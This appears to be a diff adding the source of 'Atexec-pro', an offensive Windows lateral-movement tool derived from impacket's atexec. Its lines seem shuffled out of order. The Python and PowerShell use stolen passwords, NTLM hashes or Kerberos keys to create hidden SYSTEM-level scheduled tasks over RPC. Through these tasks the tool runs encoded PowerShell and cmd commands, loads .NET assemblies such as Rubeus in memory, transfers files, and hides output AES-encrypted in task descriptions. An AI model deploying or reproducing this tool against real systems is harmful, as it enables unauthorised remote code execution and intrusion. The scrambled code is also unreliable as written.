@@ -1,0 +1,829 @@
+    
+     
+        
+          
+            
+                
+                 
+                                                                            '(128 or 256 bits)')
+                                                       'map the result with '
+                                         'If omitted it will use the domain part (FQDN) specified in the target parameter')
+                                         self.__aesKey)
+                                f.write(output)
+                            output = base64.b64decode(output)
+                            self.output_callback(output.encode(self.__codec))
+                          'again with -codec and the corresponding codec ' % CODEC)
+                          'https://docs.python.org/3/library/codecs.html
+                        'again with -codec and the corresponding codec')
+                        'https://docs.python.org/3/library/codecs.html
+                        Interface to use.
+                        continue
+                        done = True
+                        except Exception as e:
+                        https://docs.python.org/3/library/codecs.html
+                        it will use the ones specified in the command line
+                        logging.info('The specified session doesn
+                        raise
+                        self.output_callback(output.encode(self.__codec))
+                        try:
+                       'ones specified in the command line')
+                     [-dc-ip ip address] [-keytab KEYTAB]
+                     target
+                    $result = Get-Content -Path $target_file -Encoding Byte
+                    break
+                    else:
+                    f.write(xml)
+                    if save is True:
+                    if str(e).find('ERROR_FILE_NOT_FOUND') >= 0 or str(e).find('E_INVALIDARG') >= 0 :
+                    if taskState == tsch.TASK_STATE_RUNNING:
+                    logging.error(e)
+                    taskState = resp['pState']
+                $fileInfo = Get-Item $target_file
+                $result = $_.Exception.Message
+                $result = Get-Content -Path $target_file -Encoding Byte
+                New-Item -ItemType Directory -Path $dir
+                dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
+                else:
+                except Exception as e:
+                except tsch.DCERPCSessionError as e:
+                if ($fileInfo.Length -gt 1048576) {{
+                if output in xml:
+                import traceback
+                local 
+                logging.debug('Calling SchRpcRetrieveTask to get result for 
+                logging.error(e)
+                logging.error(str(e))
+                logging.getLogger().setLevel(logging.DEBUG)
+                logging.getLogger().setLevel(logging.INFO)
+                os.chdir(s)
+                output = resp_xml.split('<Description>')[1].split('</Description>')[0]
+                remote 
+                resp_xml = resp['pXml']
+                sys.exit(1)
+                time.sleep(1)
+                traceback.print_exc()
+                try:
+                tsch.hSchRpcHighestVersion(dce=dce)
+                }
+                }}
+                }}else{{
+            $consoleOutput = New-Object System.IO.MemoryStream
+            $consoleOutput.Dispose()
+            $consoleOutput.Position = 0
+            $decodeData 
+            $decodeData = ConvertFrom-Base64 $decryptedDescription
+            $decryptedDescription = Decrypt-Data $encryptionKey $description
+            $description = $definition.RegistrationInfo.Description
+            $dir = Split-Path $target_path
+            $executionResult = $streamReader.ReadToEnd()
+            $fileInfo = Get-Item $target_file
+            $oldOut = [Console]::Out
+            $result = $_.Exception.Message
+            $streamReader = New-Object System.IO.StreamReader($consoleOutput)
+            $streamReader.Dispose()
+            $streamWriter = New-Object System.IO.StreamWriter($consoleOutput)
+            $streamWriter.Dispose()
+            $streamWriter.Flush()
+            CODEC = 'utf-8'
+            [Console]::SetOut($oldOut)
+            [Console]::SetOut($streamWriter)
+            [string[]]$ARGS_NAME = @($args)
+            dce = rpctransport.get_dce_rpc()
+            dce.bind(tsch.MSRPC_UUID_TSCHS)
+            dce.connect()
+            dce.disconnect()
+            dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
+            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
+            dce.set_credentials(
+            e.get_packet().dump()
+            else:
+            except Exception as e:
+            file_data = f.read()
+            guid = resp['pGuid']            
+            if (!(Test-Path -Path $dir)) {{
+            if ($fileInfo.Length -gt 1048576) {{
+            if logging.getLogger().level == logging.DEBUG:
+            if self.__doKerberos is True:
+            if self.sessionId is None:
+            if str(e).find('STATUS_OBJECT_NAME_NOT_FOUND') >=0:
+            if taskCreated is True:
+            logging.debug('Creating task 
+            logging.debug('Deleting task 
+            logging.debug('Running task 
+            logging.debug('Task xml size: %d' % len(xml))
+            logging.error('File %s not found!' % prog)
+            logging.error('Local File %s not found!' % local)
+            logging.error(e)
+            print(data.decode(self.__codec))
+            print(os.getcwd())
+            prog = input[0]
+            randomkey = get_random_bytes(16)
+            return
+            return False
+            return [choice for choice in debug_choices if choice.startswith(text)]
+            script = f.read()
+            self.__common_ps = f.read()
+            stringbinding = r'ncacn_np:%s[
+            sys.exit(1)
+            taskCreated = False
+            taskCreated = True
+            tmpName = ''.join([random.choice(string.ascii_letters) for _ in range(8)])
+            try {{
+            try:
+            while True:
+            }}
+            }} catch {{
+            }}else{{
+        $args = $pass_args -split ' '
+        $assembly = [System.Reflection.Assembly]::Load([System.Convert]::FromBase64String($decryptedDescription))
+        $b64result = ConvertTo-Base64 $result
+        $decryptedDescription = Decrypt-Data $encryptionKey $description
+        $definition = $task.Definition
+        $definition.RegistrationInfo.Description = $b64result
+        $entryPoint = $assembly.EntryPoint
+        $executionResult = $_.Exception.Message
+        $folder = $scheduler.GetFolder($taskPath)
+        $task = $folder.GetTask($taskname)
+        $user = $task.Principal.UserId
+        <DaysInterval>1</DaysInterval>
+        CODEC = options.codec
+        [System.Runtime.InteropServices.Marshal]::ReleaseComObject($scheduler) 
+        args = args.split()
+        args = cmdline[1] if len(cmdline) > 1 else ''
+        catch {{
+        cmd = cmdline[0]
+        command = cmd 
+        command = s.command
+        dce = rpctransport.get_dce_rpc()
+        dce.bind(tsch.MSRPC_UUID_TSCHS)
+        dce.connect()
+        dce.disconnect()
+        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
+        dce.set_credentials(
+        domain = ''
+        else:
+        enc = base64.b64encode(byte_string)
+        encoded_string = enc.decode('ascii')
+        encrypted = cipher.encrypt(padded_data)
+        encrypted = raw[AES.block_size:]
+        except Exception as e:
+        except UnicodeDecodeError:
+        except tsch.DCERPCSessionError as e:
+        file_data = base64.b64encode(file_data).decode('utf-8')
+        finally:
+        from getpass import getpass
+        if 'debug' not in line:
+        if ($entryPoint -ne $null) {{
+        if (Test-Path -Path $target_file) {{
+        if CODEC is None:
+        if hashes is not None:
+        if len(args) != 2:
+        if len(data) > 1048576:
+        if len(input) < 1 or len(line) == 0 :
+        if len(input) == 1:
+        if local[-1] == '/' or local[-1] == '
+        if os.path.exists(local) is False:
+        if os.path.exists(prog) is False:
+        if remote[-1] == '/' or remote[-1] == '
+        if s == '':
+        if self.__doKerberos is True:
+        if self.check_file_size(file_data) is False:
+        if self.sessionId is not None:
+        iv = raw[:AES.block_size]
+        key = get_random_bytes(16)
+        local = s.local
+        logging.debug('Executing cmd command: %s' % command)
+        logging.debug('Executing ps command: %s' % s)
+        logging.getLogger().setLevel(logging.DEBUG)
+        logging.getLogger().setLevel(logging.INFO)
+        options.k = True
+        os.system(s)
+        padded_data = cipher.decrypt(encrypted)
+        parser.print_help()
+        print('Bye!
+        raw = base64.b64decode(encrypted_data)
+        remote = s.remote
+        replace_table = {
+        return False
+        return True
+        return base64.b64encode(cipher.iv 
+        rpctransport = transport.DCERPCTransportFactory(stringbinding)
+        s = s.command
+        self.__aesKey = aesKey
+        self.__codec = codec
+        self.__doKerberos = doKerberos
+        self.__domain = domain
+        self.__kdcHost = kdcHost
+        self.__lmhash = ''
+        self.__nthash = ''
+        self.__password = password
+        self.__rpctransport = rpctransport
+        self.__username = username
+        self.at_op.execute_cmd_command(command)
+        self.at_op.execute_cmd_command(statement.command_and_args)
+        self.at_op.execute_powershell(s)
+        self.get_common_ps()
+        self.intro = style('[
+        self.maxrepeats = 3
+        self.self_in_py = False
+        self.sessionId = sessionId
+        sys.exit(1)
+        taskCreated = False
+        try {{
+        try:
+        }}
+        }} 
+        }}   
+        }} catch {{
+        }} else {{
+        }}else{{
+      </ScheduleByDay>
+      <Arguments>-NonInteractive -enc {ps_command}</Arguments>
+      <Command>powershell.exe</Command>
+      <Enabled>true</Enabled>
+      <RestartOnIdle>false</RestartOnIdle>
+      <RunLevel>HighestAvailable</RunLevel>
+      <ScheduleByDay>
+      <StartBoundary>2015-07-15T20:35:13.2757294</StartBoundary>
+      <StopOnIdleEnd>true</StopOnIdleEnd>
+      <UserId>S-1-5-18</UserId>
+    $aesManaged = New-Object System.Security.Cryptography.AesManaged
+    $aesManaged.GenerateIV()
+    $aesManaged.IV = $combinedData[0..15]
+    $aesManaged.Key = $key
+    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
+    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+    $b64result = ConvertTo-Base64 $result
+    $combinedData = $aesManaged.IV 
+    $combinedData = ConvertFrom-Base64 $encryptedData
+    $decryptedDescription = Decrypt-Data $encryptionKey $description
+    $decryptor = $aesManaged.CreateDecryptor()
+    $definition = $task.Definition
+    $definition.RegistrationInfo.Description = $encryptedResult
+    $description = $definition.RegistrationInfo.Description
+    $encryptedDataBytes = $combinedData[16..$combinedData.Length]
+    $encryptedResult = Encrypt-Data $encryptionKey $executionResult
+    $encryptedResult = Encrypt-Data $encryptionKey $result
+    $encryptor = $aesManaged.CreateEncryptor()
+    $executionResult = iex $decryptedDescription 
+    $folder = $scheduler.GetFolder($taskPath)
+    $scheduler = New-Object -ComObject Schedule.Service
+    $scheduler.Connect()
+    $task = Get-ScheduledTask -TaskName $taskname -TaskPath 
+    $task.Description = $b64result
+    $user = $task.Principal.UserId
+    $utf8Bytes = [System.Text.Encoding]::UTF8.GetBytes($data)
+    </CalendarTrigger>
+    </Exec>
+    </IdleSettings>
+    </Principal>
+    <AllowHardTerminate>true</AllowHardTerminate>
+    <AllowStartOnDemand>true</AllowStartOnDemand>
+    <CalendarTrigger>
+    <Description>{description}</Description>
+    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+    <Enabled>true</Enabled>
+    <Exec>
+    <ExecutionTimeLimit>PT1M</ExecutionTimeLimit>
+    <Hidden>true</Hidden>
+    <IdleSettings>
+    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+    <Priority>7</Priority>
+    <RunOnlyIfIdle>false</RunOnlyIfIdle>
+    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
+    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+    <WakeToRun>false</WakeToRun>
+    @cmd2.with_argparser(cmd_parse)
+    @cmd2.with_argparser(down_parse)
+    @cmd2.with_argparser(ps_parse)
+    @cmd2.with_argparser(up_parse)
+    DownloadByCom($taskname)
+    DownloadByPs($taskname)
+    RPC_C_AUTHN_LEVEL_PKT_PRIVACY
+    Set-ScheduledTask $task
+    [System.Convert]::FromBase64String($base64String)
+    [System.Convert]::ToBase64String($byteArray)
+    [System.Runtime.InteropServices.Marshal]::ReleaseComObject($scheduler) 
+    cmd_parse = cmd2.Cmd2ArgumentParser()
+    def emptyline(self):
+    def get_common_ps(self):
+    down_parse = cmd2.Cmd2ArgumentParser()
+    else:
+    finally {{
+    group = parser.add_argument_group('authentication')
+    if (Test-Path -Path $target_file) {{
+    if (Test-Path -Path $target_path) {{
+    if domain is None:
+    if len(sys.argv)==1:
+    if options.aesKey is not None:
+    if options.codec is not None:
+    if options.debug is True:
+    if options.keytab is not None:
+    if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
+    logger.init(options.ts)
+    options = parser.parse_args()
+    parser = argparse.ArgumentParser()
+    ps_parse = cmd2.Cmd2ArgumentParser()
+    return ConvertTo-Base64 $combinedData
+    return [System.Text.Encoding]::UTF8.GetString($decryptedDataBytes)
+    shell.cmdloop()
+    try {{
+    up_parse = cmd2.Cmd2ArgumentParser()
+    }}
+    }} catch {{
+    }}catch {{
+    }}else{{
+   According to pypa/pipenv
+   commonly ignored for libraries.
+   https://pdm.fming.dev/
+   https://python-poetry.org/docs/basic-usage/
+   in version control.
+   install all needed dependencies.
+   intended to run in multiple environments
+  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)
+  -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter
+  -debug                Turn DEBUG output ON
+  -hashes LMHASH:NTHASH
+  -keytab KEYTAB        Read keys for SPN from keytab file
+  -no-pass              don't ask for password (useful for -k)
+  -session-id SESSION_ID
+  -ts                   adds timestamp to every logging output
+  </Actions>
+  </Principals>
+  </RegistrationInfo>
+  </Settings>
+  </Triggers>
+  <Principals>
+  <RegistrationInfo>
+  <Settings>
+  <Triggers>
+  JetBrains specific template is maintained in a separate JetBrains.gitignore that can
+  Usually these files are written by a python script from a template
+  and can be added to the global gitignore or merged into this file.  For a more nuclear
+  be found at https://github.com/github/gitignore/blob/main/Global/JetBrains.gitignore
+  option (not recommended) you can uncomment the following to ignore the entire idea folder.
+  target                [[domain/]username[:password]@]<targetName or address>
+ $encryptedData
+ ' ' 
+ .Net assembly
+ .Net assembly execute
+ .python-version
+ Atexec-pro
+ Base64 encode the UTF-16LE byte string
+ Byte-compiled / optimized / DLL files
+ C extensions
+ CMD command execute
+ Celery stuff
+ Check if file exists
+ Check if file is larger than 1MB
+ Check if the file size is greater than 1MB
+ Cleanup
+ Command
+ Cython debug symbols
+ Distribution / packaging
+ Django stuff:
+ Encode the PowerShell script as a UTF-16LE byte string
+ Environments
+ Features
+ File Download
+ File Upload
+ Flask stuff:
+ Get the task status code with SchRpcGetTaskInfoResponse
+ GetShell
+ IPython
+ Init the example's logger theme
+ Installer logs
+ Jupyter Notebook
+ Out-Null
+ Out-String
+ PEP 582
+ PS command execute
+ Process command-line arguments.
+ PyBuilder
+ PyCharm
+ PyInstaller
+ Pyre type checker
+ References
+ Rope project settings
+ SageMath parsed files
+ Scrapy stuff:
+ Sphinx documentation
+ Spyder project settings
+ Support ATSVC and TSCH interface.
+ This method exists only for selected protocol sequences.
+ Translations
+ Unit test / coverage reports
+ Upload/Download
+ Usage
+ Use basic_complete method for other options
+ [Advanced Windows TaskScheduler Playbook - Part.3 from RPC to lateral movement](https://www.zcgonvh.com/post/Advanced_Windows_Task_Scheduler_Playbook-Part.3_from_RPC_to_lateral_movement.html)
+ [impacket](https://github.com/fortra/impacket)
+ and 
+ args
+ base64 decode get raw data and save it to file
+ currently only support files up to 
+ encrypted).decode()
+ example
+ get the output from xml Description
+ https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/400d77fe-2f1a-4a8e-a90b-a8f82fad5a20
+ https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/eb12c947-7e20-4a30-a528-85bc433cec44
+ in size. All functions do not bypass AMSI.
+ logging.debug('Calling SchRpcGetTaskInfoResponse for 
+ logging.debug('Task XML for 
+ logging.debug('task xml: %s' % xml)
+ logging.debug(ps_script)
+ mkdocs documentation
+ mypy
+ pdm
+ pipenv
+ poetry
+ print the task guid
+ pyenv
+ pytype static type analyzer
+ set default to current directory
+ used by e.g. github.com/David-OConnor/pyflow and github.com/pdm-project/pdm
+!/usr/bin/env python
+![alt text](assets/image-1.png)
+![alt text](assets/image-2.png)
+![alt text](assets/image-3.png)
+![alt text](assets/image.png)
+"                                                       '""%s""). If errors are detected, run chcp.com at the target, '"
+"                            with open(save_path, 'wb') as f:"
+"                        NTLM hashes, format is LMHASH:NTHASH"
+"                        an existed logon session to use (no output, no cmd.exe)"
+"                        output = self.decrypt(randomkey, output)"
+"                       '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the '"
+"                    $result = ""[-] File is too large."""
+"                    logging.debug(""Task is stopped"")"
+"                    logging.error('Execution failed, no output returned or the ps killed by AV.')"
+"                    resp = tsch.hSchRpcGetInstanceInfo(dce, guid)"
+"                    resp = tsch.hSchRpcRun(dce, '"
+"                """
+"                ""'"": """
+"                ""<"": """
+"                "">"": """
+"                $result = ""[-] File is too large."""
+"                '""': """
+"                as_user = f""{self.__domain}"
+"                logging.error(""Connect error, error is {}"".format(e))"
+"                logging.info('When STATUS_OBJECT_NAME_NOT_FOUND is received, try running again. It might work')"
+"                logging.info(f""Connecting to DCE/RPC as {as_user}"")"
+"                resp = tsch.hSchRpcRetrieveTask(dce, '"
+"                resp = tsch.hSchRpcRun(dce, '"
+"                self.poutput(""Invalid value. Use true or false."")"
+"                stringbinding = epm.hept_map(addr, tsch.MSRPC_UUID_TSCHS, protocol=""ncacn_ip_tcp"")"
+"                tsch.hSchRpcDelete(dce, '"
+"                with open('task.xml', 'w') as f:"
+"            $null = $entryPoint.Invoke($null, [object[]](,$ARGS_NAME))"
+"            $result = ""["
+"            $result = ""[-] File not exists."""
+"            Write-Host ""No entry point found in assembly."""
+"            args = "" "".join(input[1:])"
+"            args = """""
+"            args = ""/C %s"" % (command)"
+"            cmd = ""cmd.exe"""
+"            cmd, args = self.cmd_split(command)"
+"            elif value.lower() == ""false"":"
+"            if ""/"" in local:"
+"            if ""/"" in remote:"
+"            if intercate == ""TSCH"":"
+"            if value.lower() == ""true"":"
+"            logging.error('Decoding error detected, consider running chcp.com at the target,"
+"            logging.error('File size is too big, please consider using a smaller file')"
+"            logging.info(""Successfully bound."")"
+"            logging.warning(""Example: execute_assembly /tmp/Rubeus.exe hash /password:X"")"
+"            print(data.decode(self.__codec, errors='replace'))"
+"            return self.basic_complete(text, line, begidx, endidx, self.settables)"
+"            rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,"
+"            rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)"
+"            self.__lmhash, self.__nthash = hashes.split(':')"
+"            self.doStuff(self.__rpctransport, randomkey=randomkey, tmpName=tmpName, description=description, script=script, save=save, save_path=save_path)"
+"            self.poutput(""Usage: set <option> <value>"")"
+"            tsch.hSchRpcDelete(dce, '"
+"            tsch.hSchRpcRegisterTask(dce, '"
+"        """"""Changes the local directory"""""""
+"        """"""Downloads a file from the target"""""""
+"        """"""Executes a .NET assembly on the target"""""""
+"        """"""Executes a command on the target"""""""
+"        """"""Executes a local shell command"""""""
+"        """"""Executes a powershell command on the target"""""""
+"        """"""Set a configuration option"""""""
+"        """"""Terminates the server process (and this session)"""""""
+"        """"""Uploads a file to the target"""""""
+"        $folder.RegisterTaskDefinition($task.Name, $definition, 6, $user, $null, $task.Definition.Principal.LogonType)"
+"        $pass_args = Decrypt-Data $encryptionKey ""REPLACE_ARGS"""
+"        $result = """""
+"        $result = ""[-] File already exists."""
+"        $result = ""[-] File not exists."""
+"        Keytab.loadKeysFromKeytab (options.keytab, username, domain, options)"
+"        Write-Error ""Failed.."""
+"        byte_string = codecs.encode(ps_script, 'utf-16le')"
+"        cipher = AES.new(key, AES.MODE_CBC)"
+"        cipher = AES.new(key, AES.MODE_CBC, iv)"
+"        cmdline = cmdline.split("" "", 1)"
+"        debug_choices = ['true', 'false']"
+"        delattr(cmd2.Cmd, 'do_edit')"
+"        delattr(cmd2.Cmd, 'do_macro')"
+"        delattr(cmd2.Cmd, 'do_py')"
+"        delattr(cmd2.Cmd, 'do_quit')"
+"        delattr(cmd2.Cmd, 'do_run_pyscript')"
+"        delattr(cmd2.Cmd, 'do_run_script')"
+"        delattr(cmd2.Cmd, 'do_shortcuts')"
+"        description = self.encrypt(randomkey, description)"
+"        encode_args = self.encrypt(key, args.lstrip())"
+"        if hasattr(rpctransport, 'set_credentials'):"
+"        if interface == ""ATSVC"":"
+"        if option == ""debug"":"
+"        if randomkey == """":"
+"        if tmpName == """":"
+"        input = line.split("" "")"
+"        logging.debug('Executing assembly: %s, args: %s' % (prog, args))"
+"        logging.info('Downloading %s to %s' % (remote, local))"
+"        logging.info('Uploading %s to %s' % (local, remote))"
+"        option, value = args"
+"        padded_data = pad(data.encode(), AES.block_size)"
+"        password = getpass(""Password:"")"
+"        ps_script = script.format(key_b64=base64.b64encode(randomkey).decode('utf-8'), common_ps=self.__common_ps, taskname=tmpName) "
+"        return ''.join(replace_table.get(c, c) for c in data)"
+"        return [cmd, args]"
+"        return unpad(padded_data, AES.block_size).decode()"
+"        script = script.replace('REPLACE_ARGS', encode_args)"
+"        script = script.replace('REPLACE_FILE_PATH', remote)"
+"        self.__common_ps = """""
+"        self.at_op = TSCH_EXEC(username, password, domain, hashes, aesKey, k, dc_ip, session_id, CODEC)"
+"        self.at_op.download_file(remote, local)"
+"        self.at_op.execute_assembly(prog, args)"
+"        self.at_op.play(address, interface)"
+"        self.at_op.upload_file(local, remote)"
+"        self.check_logon(rpctransport, interface)"
+"        self.prompt = 'ATShell (%s@%s)> ' % (username, address)"
+"        self.start_tsch("""", script, save=True, save_path=local)"
+"        self.start_tsch(command, script)"
+"        self.start_tsch(file_data, script)"
+"        self.start_tsch(file_data, script, randomkey=key)"
+"        super().__init__(allow_cli_args=False, include_ipy=False)"
+"        super().do_set("" "".join(args))"
+"        with open('./libs/powershells/cmd.ps1', 'r') as f:"
+"        with open('./libs/powershells/common.ps1', 'r') as f:"
+"        with open('./libs/powershells/download.ps1', 'r') as f:"
+"        with open('./libs/powershells/net.ps1', 'r') as f:"
+"        with open('./libs/powershells/upload.ps1', 'r') as f:"
+"        with open(local, 'rb') as f:"
+"        with open(prog, 'rb') as f:"
+"        xml = """"""<"
+"    $decryptedDataBytes = $decryptor.TransformFinalBlock($encryptedDataBytes, 0, $encryptedDataBytes.Length)"
+"    $encryptedData = $encryptor.TransformFinalBlock($utf8Bytes, 0, $utf8Bytes.Length)"
+"    $folder.RegisterTaskDefinition($task.Name, $definition, 6, $user, $null, $task.Definition.Principal.LogonType)"
+"    $result = """""
+"    $task = $folder.GetTask(""{taskname}"")"
+"    $taskPath = """
+"    <Principal id=""LocalSystem"">"
+"    CMD_LOCAL = style(""Local Command"", fg=Fg.WHITE, bg=Bg.LIGHT_BLUE, bold=True)"
+"    CMD_POST = style(""Post Exploitation"", fg=Fg.WHITE, bg=Bg.LIGHT_GREEN, bold=True)"
+"    CMD_RUN = style(""Run Command"", fg=Fg.WHITE, bg=Bg.LIGHT_RED, bold=True) "
+"    Write-Error ""Failed.."""
+"    cmd2.categorize((do_ps_exec, do_cmd_exec), CMD_RUN)"
+"    cmd2.categorize((do_shell, do_lcd), CMD_LOCAL)"
+"    cmd2.categorize((do_upload, do_download, do_execute_assembly), CMD_POST)"
+"    cmd_parse.add_argument('command', type=str, help='Command to execute')"
+"    def __init__(self, username, password, domain, hashes, aesKey, k, dc_ip, session_id, address, interface,CODEC):"
+"    def __init__(self, username='', password='', domain='', hashes=None, aesKey=None, doKerberos=False, kdcHost=None, sessionId=None, codec=""utf-8""):"
+"    def check_file_size(self, data):"
+"    def check_logon(self, rpctransport, intercate):"
+"    def cmd_split(self, cmdline):"
+"    def complete_set(self, text, line, begidx, endidx):"
+"    def decrypt(self, key, encrypted_data):"
+"    def default(self, statement: Statement):"
+"    def doStuff(self, rpctransport, randomkey="""", tmpName="""",description="""", script="""", save=False, save_path=""""):"
+"    def do_cmd_exec(self, s):"
+"    def do_download(self, s):"
+"    def do_execute_assembly(self, line):"
+"    def do_exit(self, s):"
+"    def do_lcd(self, s):"
+"    def do_ps_exec(self, s):"
+"    def do_set(self, args):"
+"    def do_shell(self, s):"
+"    def do_upload(self, s):"
+"    def download_file(self, remote, local):"
+"    def encrypt(self, key, data):"
+"    def execute_assembly(self, prog, args):"
+"    def execute_cmd_command(self, command):"
+"    def execute_powershell(self, command):"
+"    def output_callback(self,data):"
+"    def play(self, addr, interface):"
+"    def start_tsch(self, description, script, randomkey="""",tmpName="""", save=False, save_path=""""):"
+"    def upload_file(self, local, remote):"
+"    def xml_escape(self, data):"
+"    domain, username, password, address = parse_target(options.target)"
+"    down_parse.add_argument('-l','--local', type=str, help='Local file to download', default=""./"", required=False)"
+"    down_parse.add_argument('remote', type=str, help='Remote file to download')"
+"    group.add_argument('-aesKey', action=""store"", metavar = ""hex key"", help='AES key to use for Kerberos Authentication '"
+"    group.add_argument('-dc-ip', action='store',metavar = ""ip address"",  help='IP Address of the domain controller. '"
+"    group.add_argument('-hashes', action=""store"", metavar = ""LMHASH:NTHASH"", help='NTLM hashes, format is LMHASH:NTHASH')"
+"    group.add_argument('-k', action=""store_true"", help='Use Kerberos authentication. Grabs credentials from ccache file '"
+"    group.add_argument('-keytab', action=""store"", help='Read keys for SPN from keytab file')"
+"    group.add_argument('-no-pass', action=""store_true"", help='don"
+"    logging.warning(""This will work ONLY on Windows >= Vista"")"
+"    parser.add_argument(""-i"",""--interface"", action=""store"", help=""Interface to use."", default=""TSCH"", choices=(""TSCH"",""ATSVC""))"
+"    parser.add_argument('-codec', action='store', help='Sets encoding used (codec) from the target"
+"    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')"
+"    parser.add_argument('-session-id', action='store', type=int, help='an existed logon session to use (no output, no cmd.exe)')"
+"    parser.add_argument('-ts', action='store_true', help='adds timestamp to every logging output')"
+"    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')"
+"    ps_parse.add_argument('command', type=str, help='Command to execute')"
+"    shell = AtShell(username, password, domain, options.hashes, options.aesKey, options.k, options.dc_ip, options.session_id, address, options.interface, CODEC)"
+"    up_parse.add_argument('local', type=str, help='Local file to upload')"
+"    up_parse.add_argument('remote', type=str, help='Remote file to upload')"
+"   For a library or package, you might want to ignore these files since the code is"
+"   However, in case of collaboration, if having platform-specific dependencies or dependencies"
+"   Similar to Pipfile.lock, it is generally recommended to include pdm.lock in version control."
+"   Similar to Pipfile.lock, it is generally recommended to include poetry.lock in version control."
+"   This is especially recommended for binary packages to ensure reproducibility, and is more"
+"   having no cross-platform support, pipenv may install dependencies that don't work, or not"
+"   pdm stores project-wide configurations in .pdm.toml, but it is recommended to not include it"
+"  -codec CODEC          Sets encoding used (codec) from the target's output (default ""utf-8""). If errors are detected, run chcp.com at the target, map the result with"
+"  -h, --help            show this help message and exit"
+"  -i {TSCH,ATSVC}, --interface {TSCH,ATSVC}"
+"  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found,"
+"  <Actions Context=""LocalSystem"">"
+"  before PyInstaller builds the exe, so as to inject date/other infos into it."
+" Read file content and encrypt it, then save it to task description"
+" Set-Content -Path ""REPLACE_FILE_PATH"" -Encoding Byte"
+" The result will be a byte string, if you need it as a string, decode it"
+" if local is a directory, append the filename to the path"
+" if remote is a directory, append the filename to the path"
+" if target path not exists, create it"
+" otherwise, check them in:"
+""""""".format(description=self.xml_escape(description), ps_command=self.xml_escape(encoded_string))"
+""": """
+"$encryptionKey = [System.Convert]::FromBase64String(""{key_b64}"")"
+"$target_file = ""REPLACE_FILE_PATH"""
+"$target_path = ""REPLACE_FILE_PATH"""
+"$taskPath = """
+"$taskname = ""{taskname}"""
+"%s' % tmpName, flags=tsch.TASK_RUN_USE_SESSION_ID, sessionId=self.sessionId)"
+"%s' % tmpName, xml, tsch.TASK_CREATE, NULL, tsch.TASK_LOGON_NONE)"
+".py,cover"
+"598, it is recommended to include Pipfile.lock in version control."
+"<Task version=""1.3"" xmlns=""http://schemas.microsoft.com/windows/2004/02/mit/task"">"
+"The TSCH service is used by default(need port 135 a dynamic high port), port 445 is no longer required."
+"] Success."""
+"] Type help for list of commands.', fg=Fg.WHITE, bg=Bg.DARK_GRAY, bold=True) "
+"from Crypto.Util.Padding import pad, unpad"
+"from cmd2 import Bg,Fg,style"
+"from impacket.dcerpc.v5 import tsch, transport,epm"
+"from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, "
+"function Decrypt-Data($key, $encryptedData) {"
+"function Encrypt-Data($key, $data) {"
+"usage: atexec-pro.py [-h] [-i {TSCH,ATSVC}] [-session-id SESSION_ID] [-ts] [-debug] [-codec CODEC] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key]"
+"xml version=""1.0"" encoding=""UTF-16"""
+"{self.__username}"""
+$py.class
+$scheduler = New-Object -ComObject Schedule.Service
+$scheduler.Connect()
+%s' % tmpName)
+')[-1]
+'s output (default '
+'t ask for password (useful for -k)')
+'t exist!')
+.Python
+.cache
+.cover
+.coverage
+.coverage.
+.dmypy.json
+.egg
+.egg-info/
+.eggs/
+.env
+.hypothesis/
+.idea/
+.installed.cfg
+.ipynb_checkpoints
+.log
+.manifest
+.mypy_cache/
+.nox/
+.pdm.toml
+.pot
+.py[cod]
+.pybuilder/
+.pyre/
+.pytest_cache/
+.pytype/
+.ropeproject
+.sage.py
+.scrapy
+.spec
+.spyderproject
+.spyproject
+.tox/
+.venv
+.webassets-cache
+/site
+</Task>
+= local.split('
+= local.split('/')[-1]
+= remote.split('
+= remote.split('/')[-1]
+>ATSVC need port 445
+>Note: functions 
+CODEC = sys.stdout.encoding
+ENV/
+MANIFEST
+Modified based on [atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py).
+Pipfile.lock
+The technology is mainly based on [this article](https://www.zcgonvh.com/post/Advanced_Windows_Task_Scheduler_Playbook-Part.3_from_RPC_to_lateral_movement.html) by [zcgonvh](https://github.com/zcgonvh).
+[Environment]::Exit(0)
+__pycache__/
+__pypackages__/
+apos
+atsvc]' % addr
+authentication:
+build/
+celerybeat-schedule
+celerybeat.pid
+class AtShell(cmd2.Cmd):
+class TSCH_EXEC:
+cmd2>=2.4.3
+commit-your-poetrylock-file-to-version-control
+cover/
+coverage.xml
+cython_debug/
+db.sqlite3
+db.sqlite3-journal
+develop-eggs/
+dist/
+dmypy.json
+docs/_build/
+download
+downloads/
+eggs/
+env.bak/
+env/
+execute-assembly
+finally {{
+from Crypto.Cipher import AES
+from Crypto.Random import get_random_bytes
+from __future__ import division
+from __future__ import print_function
+from cmd2 import Statement
+from impacket.dcerpc.v5.dtypes import NULL
+from impacket.examples import logger
+from impacket.examples.utils import parse_target
+from impacket.krb5.keytab import Keytab
+from libs.tsch import TSCH_EXEC
+function ConvertFrom-Base64($base64String) {
+function ConvertTo-Base64($byteArray) {
+function DownloadByCom($taskname){{
+function DownloadByPs($taskname){{
+htmlcov/
+if __name__ == '__main__':
+impacket>=0.11.0
+import argparse
+import base64
+import cmd2
+import codecs
+import logging
+import os
+import random
+import string
+import sys
